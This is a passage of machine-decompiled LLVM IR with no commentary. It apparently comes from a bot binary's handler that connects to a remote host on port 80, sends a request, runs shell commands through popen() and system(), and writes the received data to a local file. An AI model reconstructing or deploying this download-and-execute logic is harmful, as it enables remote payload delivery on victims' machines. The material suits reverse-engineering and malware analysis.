  %v12_8052614 = icmp eq i32 %v4_8052614, 0
  %v13_8052614 = icmp slt i32 %v4_8052614, 0
  %v3_8052618 = icmp eq i1 %v13_8052614, %v11_8052614
  %v4_8052618 = icmp eq i1 %v12_8052614, false
  %v5_8052618 = and i1 %v4_8052618, %v3_8052618
  br i1 %v5_8052618, label %dec_label_pc_805263a, label %dec_label_pc_805261a

dec_label_pc_805261a:                             ; preds = %dec_label_pc_8052614
  %v5_805261a = icmp ult i32* %stack_var_-5260, inttoptr (i32 4 to i32*)
  store i1 %v5_805261a, i1* %cf.global-to-local, align 1
  %v4_8052628 = call i32 @Send(i32 %arg1, i32 ptrtoint ([40 x i8]* @global_var_806a708.518 to i32))
  %v5_8052630 = icmp ult i32* %stack_var_-5260, inttoptr (i32 12 to i32*)
  store i1 %v5_8052630, i1* %cf.global-to-local, align 1
  %v2_8052635 = call i32 @__GI_exit(i32 0)
  %v0_805263a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805263a

dec_label_pc_805263a:                             ; preds = %dec_label_pc_8052614, %dec_label_pc_805261a
  %v0_805263a = phi i32 [ %v0_805263a.pre, %dec_label_pc_805261a ], [ %v12_80525f0, %dec_label_pc_8052614 ]
  %v5_805263a = icmp ult i32 %v0_805263a, 4
  store i1 %v5_805263a, i1* %cf.global-to-local, align 1
  %v5_8052643 = call i32 @socket(i32 2, i32 1, i32 0)
  %v8_805264e = icmp ne i32 %v5_8052643, -1
  store i1 %v8_805264e, i1* %cf.global-to-local, align 1
  %v13_805264e = icmp eq i32 %v5_8052643, -1
  %v1_8052652 = icmp eq i1 %v13_805264e, false
  br i1 %v1_8052652, label %dec_label_pc_805263a.dec_label_pc_8052674_crit_edge, label %dec_label_pc_8052654

dec_label_pc_805263a.dec_label_pc_8052674_crit_edge: ; preds = %dec_label_pc_805263a
  br label %dec_label_pc_8052674

dec_label_pc_8052654:                             ; preds = %dec_label_pc_805263a
  %v5_8052654 = icmp ult i32* %stack_var_-5260, inttoptr (i32 4 to i32*)
  store i1 %v5_8052654, i1* %cf.global-to-local, align 1
  %v4_8052662 = call i32 @Send(i32 %arg1, i32 ptrtoint ([96 x i8]* @global_var_806a730.519 to i32))
  %v5_805266a = icmp ult i32* %stack_var_-5260, inttoptr (i32 12 to i32*)
  store i1 %v5_805266a, i1* %cf.global-to-local, align 1
  %v2_805266f = call i32 @__GI_exit(i32 0)
  %v0_805267a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052674

dec_label_pc_8052674:                             ; preds = %dec_label_pc_805263a.dec_label_pc_8052674_crit_edge, %dec_label_pc_8052654
  %v0_805267a = phi i32 [ %v12_80525f0, %dec_label_pc_805263a.dec_label_pc_8052674_crit_edge ], [ %v0_805267a.pre, %dec_label_pc_8052654 ]
  store i32 2, i32* %stack_var_-108, align 4
  %v5_805267a = icmp ult i32 %v0_805267a, 12
  store i1 %v5_805267a, i1* %cf.global-to-local, align 1
  %v2_805267f = call i32 @htons(i32 80)
  %v1_805268e = add i32 %arg4, 4
  %v5_805268e = icmp ugt i32 %arg4, -5
  %v1_8052691 = inttoptr i32 %v1_805268e to i32*
  %v2_8052691 = load i32, i32* %v1_8052691, align 4
  %v5_8052693 = icmp ult i32* %stack_var_-5260, inttoptr (i32 12 to i32*)
  store i1 %v5_8052693, i1* %cf.global-to-local, align 1
  %v2_8052697 = call i32 @inet_addr(i32 %v2_8052691)
  %v8_80526a2 = icmp ne i32 %v2_8052697, -1
  store i1 %v8_80526a2, i1* %cf.global-to-local, align 1
  %v13_80526a2 = icmp eq i32 %v2_8052697, -1
  %v1_80526a6 = icmp eq i1 %v13_80526a2, false
  br i1 %v1_80526a6, label %dec_label_pc_8052704, label %dec_label_pc_80526a8

dec_label_pc_80526a8:                             ; preds = %dec_label_pc_8052674
  %v2_80526ae = load i32, i32* %v1_8052691, align 4
  store i1 %v5_8052693, i1* %cf.global-to-local, align 1
  %v2_80526b4 = call i32 @__GI_gethostbyname(i32 %v2_80526ae)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_80526bf = icmp eq i32 %v2_80526b4, 0
  %v1_80526c3 = icmp eq i1 %v4_80526bf, false
  br i1 %v1_80526c3, label %dec_label_pc_80526e5, label %dec_label_pc_80526c5

dec_label_pc_80526c5:                             ; preds = %dec_label_pc_80526a8
  %v5_80526c5 = icmp ult i32* %stack_var_-5260, inttoptr (i32 4 to i32*)
  store i1 %v5_80526c5, i1* %cf.global-to-local, align 1
  %v4_80526d3 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_8068bc0.41 to i32))
  store i1 %v5_8052693, i1* %cf.global-to-local, align 1
  %v2_80526e0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80526e5

dec_label_pc_80526e5:                             ; preds = %dec_label_pc_80526a8, %dec_label_pc_80526c5
  %v1_80526e8 = add i32 %v2_80526b4, 12
  %v2_80526e8 = inttoptr i32 %v1_80526e8 to i32*
  %v3_80526e8 = load i32, i32* %v2_80526e8, align 4
  %v1_80526f0 = add i32 %v2_80526b4, 16
  %v2_80526f0 = inttoptr i32 %v1_80526f0 to i32*
  %v3_80526f0 = load i32, i32* %v2_80526f0, align 4
  %v1_80526f3 = inttoptr i32 %v3_80526f0 to i32*
  %v2_80526f3 = load i32, i32* %v1_80526f3, align 4
  store i32 %v2_80526f3, i32* %edx.global-to-local, align 4
  %v5_80526f8 = icmp eq i32* %stack_var_-108, inttoptr (i32 -4 to i32*)
  store i1 %v5_80526f8, i1* %cf.global-to-local, align 1
  %v15_80526f8 = ptrtoint i32* %stack_var_-104 to i32
  %tmp124 = bitcast i32* %stack_var_-104 to i8*
  store i32 %v15_80526f8, i32* @edi, align 4
  %v1_80526fd = inttoptr i32 %v2_80526f3 to i8*
  store i32 %v2_80526f3, i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_8052700 = call i8* @_memcpy(i8* %tmp124, i8* %v1_80526fd, i32 %v3_80526e8)
  br label %dec_label_pc_805270a

dec_label_pc_8052704:                             ; preds = %dec_label_pc_8052674
  store i32 %v2_8052697, i32* %stack_var_-104, align 4
  br label %dec_label_pc_805270a

dec_label_pc_805270a:                             ; preds = %dec_label_pc_80526e5, %dec_label_pc_8052704
  %v2_8052711.pre-phi = ptrtoint i32* %stack_var_-108 to i32
  %v5_8052714 = icmp ugt i32* %stack_var_-108, inttoptr (i32 -9 to i32*)
  store i1 %v5_8052714, i1* %cf.global-to-local, align 1
  %tmp125 = bitcast i32* %stack_var_-100 to i8*
  %v6_8052718 = call i32 @__GI_memset(i8* %tmp125, i32 0, i32 8)
  %v5_8052723 = icmp ult i32* %stack_var_-5260, inttoptr (i32 4 to i32*)
  store i1 %v5_8052723, i1* %cf.global-to-local, align 1
  %v5_805272c = call i32 @connect(i32 %v5_8052643, i32 %v2_8052711.pre-phi, i32 16)
  store i32 %v5_805272c, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8052734 = icmp eq i32 %v5_805272c, 0
  br i1 %v1_8052734, label %dec_label_pc_8052758, label %dec_label_pc_8052738

dec_label_pc_8052738:                             ; preds = %dec_label_pc_805270a
  store i1 %v5_8052723, i1* %cf.global-to-local, align 1
  %v4_8052746 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_8068be8.42 to i32))
  store i1 %v5_8052693, i1* %cf.global-to-local, align 1
  %v2_8052753 = call i32 @__GI_exit(i32 0)
  store i32 %v2_8052753, i32* @eax, align 4
  %v0_8052758.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052758

dec_label_pc_8052758:                             ; preds = %dec_label_pc_805270a, %dec_label_pc_8052738
  %v0_8052758 = phi i32 [ %v12_80525f0, %dec_label_pc_805270a ], [ %v0_8052758.pre, %dec_label_pc_8052738 ]
  %v5_8052758 = icmp ult i32 %v0_8052758, 8
  store i1 %v5_8052758, i1* %cf.global-to-local, align 1
  %v5_8052765 = call i32 @popen(i32 ptrtoint ([11 x i8]* @global_var_806a790.520 to i32), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_806915a.88, i32 0, i32 0))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8052770 = icmp eq i32 %v5_8052765, 0
  br i1 %v4_8052770, label %dec_label_pc_80527ee.preheader, label %dec_label_pc_8052776

dec_label_pc_8052776:                             ; preds = %dec_label_pc_8052758
  store i1 %v5_8052723, i1* %cf.global-to-local, align 1
  %v2_8052780 = ptrtoint i32* %stack_var_-1132 to i32
  %tmp127 = bitcast i32* %stack_var_-1132 to i8*
  %v6_8052787 = call i32 @__GI_memset(i8* %tmp127, i32 0, i32 1024)
  store i1 %v5_8052723, i1* %cf.global-to-local, align 1
  %v5_80527a1 = call i32 @fgets(i32 %v2_8052780, i32 1024, i32 %v5_8052765)
  %v5_80527a9 = icmp ult i32* %stack_var_-5260, inttoptr (i32 8 to i32*)
  store i1 %v5_80527a9, i1* %cf.global-to-local, align 1
  %v5_80527b8 = call i32 @strstr(i32 %v2_8052780, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_806a79b.521, i32 0, i32 0))
  %v1_80527c0 = icmp eq i32 %v5_80527b8, 0
  %v1_80527c2 = icmp eq i1 %v1_80527c0, false
  %. = zext i1 %v1_80527c2 to i8
  store i1 %v5_8052693, i1* %cf.global-to-local, align 1
  %v2_80527d4 = call i32 @pclose(i32 %v5_8052765)
  %v0_80527d9 = load i32, i32* @esp, align 4
  %v2_80527d9 = icmp ugt i32 %v0_80527d9, -17
  store i1 %v2_80527d9, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_80527ee.preheader

dec_label_pc_80527ee.preheader:                   ; preds = %dec_label_pc_8052776, %dec_label_pc_8052758
  %stack_var_-73.0.ph = phi i8 [ 0, %dec_label_pc_8052758 ], [ %., %dec_label_pc_8052776 ]
  %v1_80527f4 = add i32 %arg4, 8
  %v5_80527f4 = icmp ugt i32 %arg4, -9
  %v1_80527f7 = inttoptr i32 %v1_80527f4 to i32*
  br label %dec_label_pc_80527ee

dec_label_pc_80527eb:                             ; preds = %dec_label_pc_8052818
  %v4_80527eb = add i32 %storemerge13, 1
  br label %dec_label_pc_80527ee

dec_label_pc_80527ee:                             ; preds = %dec_label_pc_80527ee.preheader, %dec_label_pc_80527eb
  %storemerge13 = phi i32 [ %v4_80527eb, %dec_label_pc_80527eb ], [ 0, %dec_label_pc_80527ee.preheader ]
  store i32 %storemerge13, i32* %edx.global-to-local, align 4
  store i1 %v5_80527f4, i1* %cf.global-to-local, align 1
  %v2_80527f7 = load i32, i32* %v1_80527f7, align 4
  store i1 false, i1* @df, align 1
  %v4_8052807 = inttoptr i32 %v2_80527f7 to i8*
  store i32 %v2_80527f7, i32* @edi, align 4
  %v3_805280d = call i32 @_strlen(i8* %v4_8052807)
  %v0_8052814 = load i32, i32* %edx.global-to-local, align 4
  %v7_8052814 = icmp ult i32 %v0_8052814, %v3_805280d
  store i1 %v7_8052814, i1* %cf.global-to-local, align 1
  %v1_8052816 = icmp eq i1 %v7_8052814, false
  br i1 %v1_8052816, label %dec_label_pc_805282c, label %dec_label_pc_8052818

dec_label_pc_8052818:                             ; preds = %dec_label_pc_80527ee
  store i1 %v5_80527f4, i1* %cf.global-to-local, align 1
  %v2_805281e = load i32, i32* %v1_80527f7, align 4
  store i32 %v2_805281e, i32* %edx.global-to-local, align 4
  %v2_8052823 = add i32 %v2_805281e, %storemerge13
  %v1_8052826 = inttoptr i32 %v2_8052823 to i8*
  %v2_8052826 = load i8, i8* %v1_8052826, align 1
  %v6_8052828 = icmp ult i8 %v2_8052826, 58
  store i1 %v6_8052828, i1* %cf.global-to-local, align 1
  %v10_8052828 = icmp eq i8 %v2_8052826, 58
  %v1_805282a = icmp eq i1 %v10_8052828, false
  br i1 %v1_805282a, label %dec_label_pc_80527eb, label %dec_label_pc_805282c

dec_label_pc_805282c:                             ; preds = %dec_label_pc_8052818, %dec_label_pc_80527ee
  %v2_8052832 = load i32, i32* %v1_80527f7, align 4
  store i32 %v2_8052832, i32* %edx.global-to-local, align 4
  %v2_8052837 = add i32 %v2_8052832, %storemerge13
  %v1_805283a = inttoptr i32 %v2_8052837 to i8*
  store i8 0, i8* %v1_805283a, align 1
  %v4_805283d = icmp eq i8 %stack_var_-73.0.ph, 0
  store i1 %v5_80527f4, i1* %cf.global-to-local, align 1
  br i1 %v4_805283d, label %dec_label_pc_8052850, label %dec_label_pc_8052862

dec_label_pc_8052850:                             ; preds = %dec_label_pc_805282c
  %v2_8052856 = load i32, i32* %v1_80527f7, align 4
  store i32 %v2_8052856, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052862

dec_label_pc_8052862:                             ; preds = %dec_label_pc_805282c, %dec_label_pc_8052850
  store i1 %v5_805268e, i1* %cf.global-to-local, align 1
  %v4_8052876 = call i32 @Send(i32 %v5_8052643, i32 ptrtoint ([276 x i8]* @global_var_8068c10.43 to i32))
  store i1 %v5_8052723, i1* %cf.global-to-local, align 1
  %v4_805288c = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_806a7a1.522 to i32))
  store i1 %v5_8052693, i1* %cf.global-to-local, align 1
  %v2_805289c = call i32 @system(i32 ptrtoint ([11 x i8]* @global_var_806a7bf.523 to i32))
  store i32 %v2_805289c, i32* @eax, align 4
  %v5_8052b13 = icmp ult i32* %stack_var_-5260, inttoptr (i32 8 to i32*)
  store i1 %v5_8052b13, i1* %cf.global-to-local, align 1
  br i1 %v4_805283d, label %dec_label_pc_8052b13, label %dec_label_pc_80528ae

dec_label_pc_80528ae:                             ; preds = %dec_label_pc_8052862
  %v4_80528bb = call i32 @__GI_fopen(i32 ptrtoint ([8 x i8]* @global_var_806a7ca.524 to i32), i32 ptrtoint ([3 x i8]* @global_var_8068d40.45 to i32))
  %v0_80528c0 = load i32, i32* @esp, align 4
  %v2_80528c0 = icmp ugt i32 %v0_80528c0, -17
  store i1 %v2_80528c0, i1* %cf.global-to-local, align 1
  %v2_80528cd = ptrtoint i32* %stack_var_-5228 to i32
  br label %dec_label_pc_80528c6

dec_label_pc_80528c6:                             ; preds = %dec_label_pc_80529e7, %dec_label_pc_80528ae
  %v6_80528d7 = call i32 @recv(i32 %v5_8052643, i32 %v2_80528cd, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp129 = icmp slt i32 %v6_80528d7, 1
  br i1 %tmp129, label %dec_label_pc_80529fb.preheader.loopexit30, label %dec_label_pc_80528ec

dec_label_pc_80528ec:                             ; preds = %dec_label_pc_80528c6
  %v4_80528ec = add i32 %v6_80528d7, -4095
  %v8_80528ec = icmp ult i32 %v6_80528d7, 4095
  %v9_80528ec = sub i32 4094, %v6_80528d7
  %v10_80528ec = and i32 %v9_80528ec, %v6_80528d7
  %v11_80528ec = icmp slt i32 %v10_80528ec, 0
  store i1 %v8_80528ec, i1* %cf.global-to-local, align 1
  %v12_80528ec = icmp eq i32 %v4_80528ec, 0
  %v13_80528ec = icmp slt i32 %v4_80528ec, 0
  %v3_80528f3 = icmp eq i1 %v13_80528ec, %v11_80528ec
  %v4_80528f3 = icmp eq i1 %v12_80528ec, false
  %v5_80528f3 = and i1 %v4_80528f3, %v3_80528f3
  br i1 %v5_80528f3, label %dec_label_pc_805290c.lr.ph, label %dec_label_pc_80528f5

dec_label_pc_80528f5:                             ; preds = %dec_label_pc_80528ec
  %v0_80528f8 = load i32, i32* @ebp, align 4
  %v2_80528f8 = add i32 %v6_80528d7, -5224
  %v3_80528f8 = add i32 %v2_80528f8, %v0_80528f8
  %v4_80528f8 = inttoptr i32 %v3_80528f8 to i8*
  store i8 0, i8* %v4_80528f8, align 1
  br label %dec_label_pc_805290c.lr.ph

dec_label_pc_805290c.lr.ph:                       ; preds = %dec_label_pc_80528f5, %dec_label_pc_80528ec
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_805290c

dec_label_pc_805290c:                             ; preds = %dec_label_pc_805290c.lr.ph, %dec_label_pc_80529e7
  %storemerge8196 = phi i32 [ 0, %dec_label_pc_805290c.lr.ph ], [ %v4_80529e7, %dec_label_pc_80529e7 ]
  store i32 %storemerge8196, i32* %edx.global-to-local, align 4
  %v2_8052917 = add i32 %storemerge8196, %v2_80528cd
  %v7_8052917 = icmp ult i32 %v2_8052917, %v2_80528cd
  store i1 %v7_8052917, i1* %cf.global-to-local, align 1
  store i1 false, i1* @df, align 1
  %v4_8052934 = inttoptr i32 %v2_8052917 to i8*
  store i32 %v2_8052917, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8068d43.46 to i32), i32* @edi, align 4
  %v7_8052946 = call i32 @_strncmp(i8* %v4_8052934, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8068d43.46, i32 0, i32 0), i32 4)
  %v8_8052946 = urem i32 %v7_8052946, 2
  %v9_8052946 = icmp eq i32 %v8_8052946, 0
  %v0_8052948 = load i1, i1* %cf.global-to-local, align 1
  %v2_8052948 = or i1 %v0_8052948, %v9_8052946
  %v3_8052948 = zext i1 %v2_8052948 to i32
  %v4_8052948 = load i32, i32* %edx.global-to-local, align 4
  %v5_8052948 = and i32 %v4_8052948, -256
  %v6_8052948 = or i32 %v3_8052948, %v5_8052948
  %v7_8052948 = xor i32 %v6_8052948, 1
  store i32 %v7_8052948, i32* @edx, align 4
  %v3_805294e = and i32 %v7_8052946, -256
  %v1_8052950 = trunc i32 %v7_8052948 to i8
  %v3_8052950 = zext i1 %v0_8052948 to i8
  %v4_8052950 = sub nsw i8 %v1_8052950, %v3_8052950
  %v15_8052950 = icmp eq i8 %v4_8052950, 0
  %v20_8052950 = zext i8 %v4_8052950 to i32
  %v23_8052950 = or i32 %v20_8052950, %v3_805294e
  store i32 %v23_8052950, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8052959 = icmp eq i1 %v15_8052950, false
  br i1 %v1_8052959, label %dec_label_pc_80529e7, label %dec_label_pc_805295f

dec_label_pc_805295f:                             ; preds = %dec_label_pc_805290c
  %v4_805295f = add i32 %storemerge8196, 4
  %v1_805296e = add i32 %v4_80528bb, 52
  %v2_805296e = inttoptr i32 %v1_805296e to i32*
  %v1_8052978 = add i32 %v4_80528bb, 16
  %v2_8052978 = inttoptr i32 %v1_8052978 to i32*
  %v1_805297e = add i32 %v4_80528bb, 28
  %v2_805297e = inttoptr i32 %v1_805297e to i32*
  %v10_80529e0180 = icmp ult i32 %v4_805295f, %v6_80528d7
  store i1 %v10_80529e0180, i1* %cf.global-to-local, align 1
  %v5_80529e3186 = icmp slt i32 %v4_805295f, %v6_80528d7
  br i1 %v5_80529e3186, label %dec_label_pc_8052965, label %dec_label_pc_80529fb.preheader

dec_label_pc_8052965:                             ; preds = %dec_label_pc_805295f, %dec_label_pc_80529da
  %storemerge22.in187 = phi i32 [ %v4_80529da, %dec_label_pc_80529da ], [ %v4_805295f, %dec_label_pc_805295f ]
  %v3_805296e = load i32, i32* %v2_805296e, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8052971 = icmp eq i32 %v3_805296e, 0
  br i1 %v1_8052971, label %dec_label_pc_80529be, label %dec_label_pc_8052975

dec_label_pc_8052975:                             ; preds = %dec_label_pc_8052965
  %v3_8052978 = load i32, i32* %v2_8052978, align 4
  store i32 %v3_8052978, i32* @edx, align 4
  %v3_805297e = load i32, i32* %v2_805297e, align 4
  %v7_8052981 = icmp ult i32 %v3_8052978, %v3_805297e
  store i1 %v7_8052981, i1* %cf.global-to-local, align 1
  %v1_8052983 = icmp eq i1 %v7_8052981, false
  br i1 %v1_8052983, label %dec_label_pc_80529a0, label %dec_label_pc_8052985

dec_label_pc_8052985:                             ; preds = %dec_label_pc_8052975
  %v3_8052988 = load i32, i32* %v2_8052978, align 4
  store i32 %v3_8052988, i32* %edx.global-to-local, align 4
  %v0_805298e = load i32, i32* @ebp, align 4
  %v2_805298e = add i32 %storemerge22.in187, -5224
  %v3_805298e = add i32 %v2_805298e, %v0_805298e
  %v4_805298e = inttoptr i32 %v3_805298e to i8*
  %v5_805298e = load i8, i8* %v4_805298e, align 1
  %v3_8052995 = inttoptr i32 %v3_8052988 to i8*
  store i8 %v5_805298e, i8* %v3_8052995, align 1
  %v0_8052997 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052997 = add i32 %v0_8052997, 1
  store i32 %v1_8052997, i32* @edx, align 4
  store i32 %v1_8052997, i32* %v2_8052978, align 4
  br label %dec_label_pc_80529da

dec_label_pc_80529a0:                             ; preds = %dec_label_pc_8052975
  %v0_80529a3 = load i32, i32* @ebp, align 4
  %v2_80529a3 = add i32 %storemerge22.in187, -5224
  %v3_80529a3 = add i32 %v2_80529a3, %v0_80529a3
  %v4_80529a3 = inttoptr i32 %v3_80529a3 to i8*
  %v5_80529a3 = load i8, i8* %v4_80529a3, align 1
  %v0_80529ad = load i32, i32* @esp, align 4
  %v5_80529ad = icmp ult i32 %v0_80529ad, 8
  store i1 %v5_80529ad, i1* %cf.global-to-local, align 1
  %v5_80529b4 = call i32 @putc_unlocked(i8 %v5_80529a3, i32 %v4_80528bb)
  %v0_80529b9 = load i32, i32* @esp, align 4
  %v2_80529b9 = icmp ugt i32 %v0_80529b9, -17
  store i1 %v2_80529b9, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_80529da

dec_label_pc_80529be:                             ; preds = %dec_label_pc_8052965
  %v0_80529c1 = load i32, i32* @ebp, align 4
  %v2_80529c1 = add i32 %storemerge22.in187, -5224
  %v3_80529c1 = add i32 %v2_80529c1, %v0_80529c1
  %v4_80529c1 = inttoptr i32 %v3_80529c1 to i8*
  %v5_80529c1 = load i8, i8* %v4_80529c1, align 1
  %v0_80529cb = load i32, i32* @esp, align 4
  %v5_80529cb = icmp ult i32 %v0_80529cb, 8
  store i1 %v5_80529cb, i1* %cf.global-to-local, align 1
  %v5_80529d2 = call i32 @__GI_fputc(i8 %v5_80529c1, i32 %v4_80528bb)
  %v0_80529d7 = load i32, i32* @esp, align 4
  %v2_80529d7 = icmp ugt i32 %v0_80529d7, -17
  store i1 %v2_80529d7, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_80529da

dec_label_pc_80529da:                             ; preds = %dec_label_pc_80529a0, %dec_label_pc_8052985, %dec_label_pc_80529be
  %v4_80529da = add i32 %storemerge22.in187, 1
  %v10_80529e0 = icmp ult i32 %v4_80529da, %v6_80528d7
  store i1 %v10_80529e0, i1* %cf.global-to-local, align 1
  %exitcond203 = icmp eq i32 %v4_80529da, %v6_80528d7
  br i1 %exitcond203, label %dec_label_pc_80529fb.preheader, label %dec_label_pc_8052965

dec_label_pc_80529fb.preheader.loopexit30:        ; preds = %dec_label_pc_80528c6
  %.pre59 = add i32 %v4_80528bb, 52
  %.pre60 = inttoptr i32 %.pre59 to i32*
  %.pre62 = add i32 %v4_80528bb, 16
  %.pre63 = inttoptr i32 %.pre62 to i32*
  %.pre64 = add i32 %v4_80528bb, 28
  %.pre65 = inttoptr i32 %.pre64 to i32*
  br label %dec_label_pc_80529fb.preheader

dec_label_pc_80529fb.preheader:                   ; preds = %dec_label_pc_805295f, %dec_label_pc_80529da, %dec_label_pc_80529fb.preheader.loopexit30
  %v2_8052a57.pre-phi = phi i32* [ %.pre65, %dec_label_pc_80529fb.preheader.loopexit30 ], [ %v2_805297e, %dec_label_pc_80529da ], [ %v2_805297e, %dec_label_pc_805295f ]
  %v2_8052a51.pre-phi = phi i32* [ %.pre63, %dec_label_pc_80529fb.preheader.loopexit30 ], [ %v2_8052978, %dec_label_pc_80529da ], [ %v2_8052978, %dec_label_pc_805295f ]
  %v2_8052a47.pre-phi = phi i32* [ %.pre60, %dec_label_pc_80529fb.preheader.loopexit30 ], [ %v2_805296e, %dec_label_pc_80529da ], [ %v2_805296e, %dec_label_pc_805295f ]
  br label %dec_label_pc_80529fb

dec_label_pc_80529e7:                             ; preds = %dec_label_pc_805290c
  %v4_80529e7 = add nuw nsw i32 %storemerge8196, 1
  %v10_80529ed = icmp ult i32 %v4_80529e7, %v6_80528d7
  store i1 %v10_80529ed, i1* %cf.global-to-local, align 1
  %v5_80529f0 = icmp slt i32 %v4_80529e7, %v6_80528d7
  br i1 %v5_80529f0, label %dec_label_pc_805290c, label %dec_label_pc_80528c6

dec_label_pc_80529fb:                             ; preds = %dec_label_pc_8052ab3, %dec_label_pc_80529fb.preheader
  %v6_8052a0c = call i32 @recv(i32 %v5_8052643, i32 %v2_80528cd, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp130 = icmp slt i32 %v6_8052a0c, 1
  br i1 %tmp130, label %dec_label_pc_8052ac3, label %dec_label_pc_8052a21

dec_label_pc_8052a21:                             ; preds = %dec_label_pc_80529fb
  %v4_8052a21 = add i32 %v6_8052a0c, -4095
  %v8_8052a21 = icmp ult i32 %v6_8052a0c, 4095
  %v9_8052a21 = sub i32 4094, %v6_8052a0c
  %v10_8052a21 = and i32 %v9_8052a21, %v6_8052a0c
  %v11_8052a21 = icmp slt i32 %v10_8052a21, 0
  store i1 %v8_8052a21, i1* %cf.global-to-local, align 1
  %v12_8052a21 = icmp eq i32 %v4_8052a21, 0
  %v13_8052a21 = icmp slt i32 %v4_8052a21, 0
  %v3_8052a28 = icmp eq i1 %v13_8052a21, %v11_8052a21
  %v4_8052a28 = icmp eq i1 %v12_8052a21, false
  %v5_8052a28 = and i1 %v4_8052a28, %v3_8052a28
  br i1 %v5_8052a28, label %dec_label_pc_8052a3e.lr.ph, label %dec_label_pc_8052a2a

dec_label_pc_8052a2a:                             ; preds = %dec_label_pc_8052a21
  %v0_8052a2d = load i32, i32* @ebp, align 4
  %v2_8052a2d = add i32 %v6_8052a0c, -5224
  %v3_8052a2d = add i32 %v2_8052a2d, %v0_8052a2d
  %v4_8052a2d = inttoptr i32 %v3_8052a2d to i8*
  store i8 0, i8* %v4_8052a2d, align 1
  br label %dec_label_pc_8052a3e.lr.ph

dec_label_pc_8052a3e.lr.ph:                       ; preds = %dec_label_pc_8052a2a, %dec_label_pc_8052a21
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8052a3e

dec_label_pc_8052a3e:                             ; preds = %dec_label_pc_8052ab3, %dec_label_pc_8052a3e.lr.ph
  %storemerge178 = phi i32 [ 0, %dec_label_pc_8052a3e.lr.ph ], [ %v4_8052ab3, %dec_label_pc_8052ab3 ]
  %v3_8052a47 = load i32, i32* %v2_8052a47.pre-phi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8052a4a = icmp eq i32 %v3_8052a47, 0
  br i1 %v1_8052a4a, label %dec_label_pc_8052a97, label %dec_label_pc_8052a4e

dec_label_pc_8052a4e:                             ; preds = %dec_label_pc_8052a3e
  %v3_8052a51 = load i32, i32* %v2_8052a51.pre-phi, align 4
  store i32 %v3_8052a51, i32* @edx, align 4
  %v3_8052a57 = load i32, i32* %v2_8052a57.pre-phi, align 4
  %v7_8052a5a = icmp ult i32 %v3_8052a51, %v3_8052a57
  store i1 %v7_8052a5a, i1* %cf.global-to-local, align 1
  %v1_8052a5c = icmp eq i1 %v7_8052a5a, false
  br i1 %v1_8052a5c, label %dec_label_pc_8052a79, label %dec_label_pc_8052a5e

dec_label_pc_8052a5e:                             ; preds = %dec_label_pc_8052a4e
  %v3_8052a61 = load i32, i32* %v2_8052a51.pre-phi, align 4
  store i32 %v3_8052a61, i32* %edx.global-to-local, align 4
  %v0_8052a67 = load i32, i32* @ebp, align 4
  %v2_8052a67 = add nsw i32 %storemerge178, -5224
  %v3_8052a67 = add i32 %v2_8052a67, %v0_8052a67
  %v4_8052a67 = inttoptr i32 %v3_8052a67 to i8*
  %v5_8052a67 = load i8, i8* %v4_8052a67, align 1
  %v3_8052a6e = inttoptr i32 %v3_8052a61 to i8*
  store i8 %v5_8052a67, i8* %v3_8052a6e, align 1
  %v0_8052a70 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052a70 = add i32 %v0_8052a70, 1
  store i32 %v1_8052a70, i32* @edx, align 4
  store i32 %v1_8052a70, i32* %v2_8052a51.pre-phi, align 4
  br label %dec_label_pc_8052ab3

dec_label_pc_8052a79:                             ; preds = %dec_label_pc_8052a4e
  %v0_8052a7c = load i32, i32* @ebp, align 4
  %v2_8052a7c = add nsw i32 %storemerge178, -5224
  %v3_8052a7c = add i32 %v2_8052a7c, %v0_8052a7c
  %v4_8052a7c = inttoptr i32 %v3_8052a7c to i8*
  %v5_8052a7c = load i8, i8* %v4_8052a7c, align 1
  %v0_8052a86 = load i32, i32* @esp, align 4
  %v5_8052a86 = icmp ult i32 %v0_8052a86, 8
  store i1 %v5_8052a86, i1* %cf.global-to-local, align 1
  %v5_8052a8d = call i32 @putc_unlocked(i8 %v5_8052a7c, i32 %v4_80528bb)
  %v0_8052a92 = load i32, i32* @esp, align 4
  %v2_8052a92 = icmp ugt i32 %v0_8052a92, -17
  store i1 %v2_8052a92, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8052ab3

dec_label_pc_8052a97:                             ; preds = %dec_label_pc_8052a3e
  %v0_8052a9a = load i32, i32* @ebp, align 4
  %v2_8052a9a = add nsw i32 %storemerge178, -5224
  %v3_8052a9a = add i32 %v2_8052a9a, %v0_8052a9a
  %v4_8052a9a = inttoptr i32 %v3_8052a9a to i8*
  %v5_8052a9a = load i8, i8* %v4_8052a9a, align 1
  %v0_8052aa4 = load i32, i32* @esp, align 4
  %v5_8052aa4 = icmp ult i32 %v0_8052aa4, 8
  store i1 %v5_8052aa4, i1* %cf.global-to-local, align 1
  %v5_8052aab = call i32 @__GI_fputc(i8 %v5_8052a9a, i32 %v4_80528bb)
